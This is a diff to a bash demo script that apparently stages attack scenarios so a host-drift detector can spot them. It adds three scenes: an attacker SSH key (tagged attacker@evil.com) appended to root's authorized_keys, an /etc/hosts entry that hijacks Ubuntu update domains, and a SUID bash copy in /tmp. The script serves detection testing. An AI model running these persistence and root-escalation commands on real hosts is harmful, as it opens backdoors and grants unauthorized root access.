@@ -44,7 +44,7 @@ echo -e "${YEL}  Press ENTER to begin...${RST}"
 read -r
 
 # ── SCENE 1 ──────────────────────────────────────────────────
-banner "SCENE 1 / 8 — Backdoor port listener  [LISTENERS]"
+banner "SCENE 1 / 11 — Backdoor port listener  [LISTENERS]"
 echo -e "  ${RED}Attack:${RST}  Attacker opens a reverse-shell listener on TCP 4444."
 echo -e "  ${GRN}Detects:${RST} New entry in ss -tlnp not present in baseline."
 echo ""
@@ -54,7 +54,7 @@ echo -e "  ${GRN}✓${RST} Port 4444 is now listening (PID $!)"
 pause
 
 # ── SCENE 2 ──────────────────────────────────────────────────
-banner "SCENE 2 / 8 — Sudoers privilege escalation  [SUDOERS]"
+banner "SCENE 2 / 11 — Sudoers privilege escalation  [SUDOERS]"
 echo -e "  ${RED}Attack:${RST}  Adds a NOPASSWD wildcard sudoers entry — any command as root."
 echo -e "  ${GRN}Detects:${RST} New file in /etc/sudoers.d with unrestricted escalation."
 echo ""
@@ -64,7 +64,7 @@ echo -e "  ${GRN}✓${RST} /etc/sudoers.d/demo-backdoor created"
 pause
 
 # ── SCENE 3 ──────────────────────────────────────────────────
-banner "SCENE 3 / 8 — Rogue user account  [USERS]"
+banner "SCENE 3 / 11 — Rogue user account  [USERS]"
 echo -e "  ${RED}Attack:${RST}  Creates a hidden user account 'attacker-ssh'."
 echo -e "  ${GRN}Detects:${RST} New UID >= 1000 entry in /etc/passwd not in baseline."
 echo ""
@@ -73,7 +73,7 @@ echo -e "  ${GRN}✓${RST} User 'attacker-ssh' added ($(id attacker-ssh))"
 pause
 
 # ── SCENE 4 ──────────────────────────────────────────────────
-banner "SCENE 4 / 8 — Sudo group membership  [SUDO GROUP]"
+banner "SCENE 4 / 11 — Sudo group membership  [SUDO GROUP]"
 echo -e "  ${RED}Attack:${RST}  Grants 'attacker-ssh' full sudo access via group membership."
 echo -e "  ${GRN}Detects:${RST} getent group sudo shows new member not in baseline."
 echo ""
@@ -83,7 +83,7 @@ getent group sudo
 pause
 
 # ── SCENE 5 ──────────────────────────────────────────────────
-banner "SCENE 5 / 8 — Cron persistence  [CRON]"
+banner "SCENE 5 / 11 — Cron persistence  [CRON]"
 echo -e "  ${RED}Attack:${RST}  Plants a beacon cron job to call home every 5 minutes."
 echo -e "  ${GRN}Detects:${RST} New file in /etc/cron.d not present in baseline."
 echo ""
@@ -97,7 +97,7 @@ ls /etc/cron.d/
 pause
 
 # ── SCENE 6 ──────────────────────────────────────────────────
-banner "SCENE 6 / 8 — Suspicious new service  [SERVICES]"
+banner "SCENE 6 / 11 — Suspicious new service  [SERVICES]"
 echo -e "  ${RED}Attack:${RST}  Installs a persistent systemd service disguised as telemetry."
 echo -e "  ${GRN}Detects:${RST} New running service not present in baseline service list."
 echo ""
@@ -118,7 +118,7 @@ systemctl status demo-beacon --no-pager | grep -E 'Active|Loaded'
 pause
 
 # ── SCENE 7 ──────────────────────────────────────────────────
-banner "SCENE 7 / 8 — SSH hardening reverted  [SSH CONFIG]"
+banner "SCENE 7 / 11 — SSH hardening reverted  [SSH CONFIG]"
 echo -e "  ${RED}Attack:${RST}  Re-enables root password login — CIS Benchmark Level 1 failure."
 echo -e "  ${GRN}Detects:${RST} sshd -T output changed: permitrootlogin yes."
 echo ""
@@ -129,7 +129,7 @@ grep 'PermitRootLogin' /etc/ssh/sshd_config
 pause
 
 # ── SCENE 8 ──────────────────────────────────────────────────
-banner "SCENE 8 / 8 — Firewall rule added  [FIREWALL]"
+banner "SCENE 8 / 11 — Firewall rule added  [FIREWALL]"
 echo -e "  ${RED}Attack:${RST}  Opens port 8080 inbound — exposes an internal service."
 echo -e "  ${GRN}Detects:${RST} ufw status verbose shows new rule not in baseline."
 echo ""
@@ -138,14 +138,46 @@ echo -e "  ${GRN}✓${RST} Port 8080 now open in ufw"
 ufw status | grep 8080
 pause
 
+# ── SCENE 9 ──────────────────────────────────────────────────
+banner "SCENE 9 / 11 — SSH authorized key backdoor  [SSH KEYS]"
+echo -e "  ${RED}Attack:${RST}  Injects a persistent SSH key into root's authorized_keys."
+echo -e "  ${GRN}Detects:${RST} New entry in ~/.ssh/authorized_keys not present in baseline."
+echo ""
+mkdir -p /root/.ssh && chmod 700 /root/.ssh
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0demoFakeKeyBlackglassXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX attacker@evil.com' >> /root/.ssh/authorized_keys
+echo -e "  ${GRN}✓${RST} Attacker key injected into /root/.ssh/authorized_keys"
+wc -l /root/.ssh/authorized_keys && echo "  (lines in authorized_keys)"
+pause
+
+# ── SCENE 10 ──────────────────────────────────────────────────
+banner "SCENE 10 / 11 — DNS hijacking via /etc/hosts  [NETWORK CONFIG]"
+echo -e "  ${RED}Attack:${RST}  Redirects package mirror domains to attacker-controlled IP."
+echo -e "  ${GRN}Detects:${RST} New entry in /etc/hosts not present in baseline."
+echo ""
+echo '10.10.10.10 updates.ubuntu.com security.ubuntu.com packages.ubuntu.com  # demo-dns-hijack' >> /etc/hosts
+echo -e "  ${GRN}✓${RST} DNS hijack entry added to /etc/hosts"
+grep 'demo-dns-hijack' /etc/hosts
+pause
+
+# ── SCENE 11 ──────────────────────────────────────────────────
+banner "SCENE 11 / 11 — SUID binary planted  [PRIVILEGE ESCALATION]"
+echo -e "  ${RED}Attack:${RST}  Copies bash with SUID bit — any user can run as root."
+echo -e "  ${GRN}Detects:${RST} New binary with SUID/SGID bit not present in baseline."
+echo ""
+cp /bin/bash /tmp/demo-suid-shell && chmod +s /tmp/demo-suid-shell
+echo -e "  ${GRN}✓${RST} SUID shell planted:"
+ls -la /tmp/demo-suid-shell
+pause
+
 # ── SUMMARY ──────────────────────────────────────────────────
 echo ""
 echo -e "${CYN}============================================================${RST}"
-echo -e "${CYN}  DEMO COMPLETE — 8 attack scenarios shown${RST}"
+echo -e "${CYN}  DEMO COMPLETE — 11 attack scenarios shown${RST}"
 echo -e "${CYN}============================================================${RST}"
 echo ""
 echo -e "  Surfaces triggered: Listeners · Sudoers · Users · Sudo group"
 echo -e "                      Cron · Services · SSH config · Firewall"
+echo -e "                      SSH Keys · DNS Hijack · SUID Binary"
 echo ""
 echo -e "  ${YEL}To reset the host:  bash /root/demo/reset.sh${RST}"
 echo ""
